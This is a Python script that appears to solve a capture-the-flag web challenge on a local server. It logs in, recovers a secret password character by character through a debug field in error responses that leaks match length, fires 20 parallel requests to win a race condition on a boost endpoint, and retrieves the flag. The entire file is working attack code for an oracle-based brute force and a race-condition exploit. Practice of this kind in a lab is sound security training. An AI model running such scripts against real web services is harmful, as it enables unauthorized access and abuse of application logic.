import requests
import random
import string
import threading
import time
url = "http://localhost:42069"

def bruteforce_token(cookies):
    characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    found = ""
    i = 0
    while True:
        f = False
        for char in characters:
            test_token = found + char
            response = requests.post(f"{url}/sboost?secret_password={test_token}", cookies=cookies)
            if response.status_code == 403:
                print(f"Trying token: {test_token} - Invalid")
                r = response.json().get('debug', 'No debug info')
                n = r.split(' ')[2]
                if int(n) > len(found):
                    print(f"Found so far: {found} - Next character is {char}")
                    found += char
                    f = True
                    break
            elif response.status_code == 200:
                print(f"Found valid token: {test_token}")
                return test_token
            else:
                print(f"Unexpected response for token {test_token}: {response.status_code}")
        if f == False:
            print(f"Final token found: {found}")
            return found
        
def login(username):
    response = requests.post(f"{url}/", data={'username': username}, allow_redirects=False)
    print(response.status_code)

    if response.status_code == 302:
        print(f"Logged in as {username}")
        print(f"Session cookies: {response.cookies.get_dict()}")
        return response.cookies.get_dict()
    
    else:
        print(f"Login failed: {response.text}")
        return None

def travel(cookies):
    session = requests.Session()
    response = session.post(f"{url}/travel", cookies=cookies)
    if response.status_code == 200:
        print(f"Travel successful")
    else:
        print(f"Travel failed for: {response.text}")

def send_request(thread_id, cookies, token):
    session = requests.Session()
    response = session.post(f"{url}/sboost?secret_password={token}", cookies=cookies)
    if response.status_code == 200:
        print(f"Thread {thread_id}: Boost successful")
        print(f"Response: {response.json()}")
    else:
        print(f"Thread {thread_id}: Boost failed - {response.text}")

def get_flag(cookies):
    session = requests.Session()
    response = session.get(f"{url}/flag", cookies=cookies)
    if response.status_code == 200:
        print(f"Flag: {response.json()['message']}")
    else:
        print(f"Failed to get flag: {response.text}")

def main():
    username = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
    cookies = login(username)
    if not cookies:
        print("Login failed")
        return
    threads = []

    token = bruteforce_token(cookies)
    if not token:
        print("Failed to brute force token")
        return

    # Create 5 threads to simulate race condition
    for i in range(20):
        t = threading.Thread(target=send_request, args=(i,cookies, token))
        threads.append(t)

    start = time.time()
    
    travel(cookies)

    # Start all threads almost simultaneously
    for t in threads:
        t.start()

    # Wait for all threads to finish
    for t in threads:
        t.join()

    end = time.time()
    print(f"All requests completed in {end - start:.3f} seconds.")
    get_flag(cookies)

if __name__ == "__main__":
    main()
